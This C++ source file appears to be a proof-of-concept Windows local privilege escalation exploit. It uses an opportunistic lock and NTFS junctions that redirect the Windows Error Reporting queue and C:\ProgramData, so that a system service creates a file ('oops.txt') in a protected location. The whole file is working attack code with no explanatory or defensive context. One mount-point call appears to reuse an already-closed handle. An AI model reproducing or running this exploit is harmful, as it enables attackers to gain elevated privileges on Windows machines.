#include "stdafx.h"
#include "comdef.h"
#include "ReparsePoint.h"
#include <iostream>
#include "FileOpLock.h"
#include "shlobj.h"
#include "Shlwapi.h"
using namespace std;
#pragma comment(lib, "Shlwapi.lib")
BOOLEAN lockdone = false;
LPWSTR path2;
LPWSTR GetProfileDirectory()
{
	LPWSTR lpRet = nullptr;

	SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &lpRet);

	

	return lpRet;
}



void UnlockFile()
{
	wcout << _T("Oplock triggered, creating Junction") <<  endl;
	HANDLE hJunction = CreateFile(L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue", GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);
	
	std::wstring mywstring(GetProfileDirectory());
	std::wstring concatted_stdstr = mywstring + L"\\1";
	LPCWSTR concatted = concatted_stdstr.c_str();
	

	ReparsePoint::CreateMountPoint(hJunction, concatted, L"");
	CloseHandle(hJunction);
	
	std::wstring concatted_stdstr2 = mywstring + L"\\1\\1_1_1_1_2010";
	LPCWSTR concatted2 = concatted_stdstr2.c_str();
	

	CreateDirectory(concatted2, NULL);

	HANDLE hJunction2 = CreateFile(concatted2, GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);

	ReparsePoint::CreateMountPoint(hJunction, L"c:\\programdata", L"");
	CloseHandle(hJunction2);

	lockdone = TRUE;	

		



}

int _tmain()
{


	std::wstring mywstring(GetProfileDirectory());
	std::wstring concatted_stdstr = mywstring + L"\\2\\1_1_1_1_2010\\USOPrivate";
	LPCWSTR concatted = concatted_stdstr.c_str();



	FileOpLock::CreateLock(concatted, UnlockFile);	
	while (lockdone == FALSE)
	{
		Sleep(1000);
	}
	Sleep(10000);
	CreateDirectory(L"c:\\programdata\\USOPrivate", NULL);
	CreateFile(L"c:\\programdata\\USOPrivate\\oops.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL,
		NULL);


	return 0;
}

